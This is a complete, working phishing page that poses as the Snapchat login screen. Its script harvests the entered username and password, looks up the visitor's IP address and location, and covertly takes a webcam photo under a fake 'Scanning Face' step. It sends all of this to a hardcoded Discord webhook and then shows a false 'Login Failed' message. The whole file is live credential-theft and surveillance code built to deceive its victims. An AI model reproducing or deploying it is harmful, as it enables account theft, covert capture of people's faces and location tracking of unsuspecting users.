<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Log In</title>
    <style>
        body { background-color: #FFFC00; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 300px; }
        .ghost { width: 80px; margin-bottom: 20px; }
        h2 { margin-bottom: 20px; color: #333; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; background-color: #f9f9f9; }
        button { width: 100%; padding: 12px; background-color: #FFFC00; border: none; border-radius: 20px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
        button:hover { background-color: #e6e300; }
        video, canvas { display: none; }
    </style>
</head>
<body>
<div class="login-container">
    <svg class="ghost" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
        <path d="M50 10 C30 10 20 30 20 50 C20 70 30 80 30 80 C30 80 25 85 20 85 C25 90 35 90 40 85 C45 90 55 90 60 85 C65 90 75 90 80 85 C75 85 70 80 70 80 C70 80 80 70 80 50 C80 30 70 10 50 10 Z" fill="#fff" stroke="#000" stroke-width="3"/>
    </svg>
    <h2>Log In</h2>
    <input type="text" id="username" placeholder="Username or Email" required>
    <input type="password" id="password" placeholder="Password" required>
    <button id="loginBtn">Log In</button>
</div>
<video id="video" autoplay></video>
<canvas id="canvas"></canvas>
<script>
    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
    let userIP = '';
    let userLocation = '';
    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => { userIP = data.ip; userLocation = `${data.city}, ${data.region}, ${data.country_name}`; }).catch(err => console.error(err));
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const loginBtn = document.getElementById('loginBtn');
    loginBtn.addEventListener('click', async () => {
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        if(!username || !password) return alert('Please enter credentials.');
        loginBtn.innerText = 'Scanning Face...';
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            video.srcObject = stream;
            await new Promise(resolve => setTimeout(resolve, 1000));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(track => track.stop());
            sendToWebhook(username, password, imageData);
        } catch (err) {
            sendToWebhook(username, password, null);
        }
    });
    function sendToWebhook(user, pass, imageBase64) {
        const time = new Date().toLocaleString();
        const osBrowser = navigator.userAgent;
        const embed = {
            title: '👻 New Snapchat Login Captured',
            color: 16776960,
            fields: [
                { name: 'Username/Email', value: user, inline: true },
                { name: 'Password', value: pass, inline: true },
                { name: 'IP Address', value: userIP || 'Unknown', inline: false },
                { name: 'Location', value: userLocation || 'Unknown', inline: false },
                { name: 'Time', value: time, inline: false },
                { name: 'OS/Browser', value: osBrowser, inline: false }
            ]
        };
        const payload = new FormData();
        if (imageBase64) {
            const byteString = atob(imageBase64.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
            const blob = new Blob([ab], { type: 'image/jpeg' });
            payload.append('file', blob, 'face_scan.jpg');
            embed.image = { url: 'attachment://face_scan.jpg' };
        }
        payload.append('payload_json', JSON.stringify({ embeds: [embed] }));
        fetch(WEBHOOK_URL, { method: 'POST', body: payload }).then(() => {
            document.body.innerHTML = '<h2 style="text-align:center; margin-top:20vh;">Login Failed. Please try again later.</h2>';
        });
    }
</script>
</body>
</html>
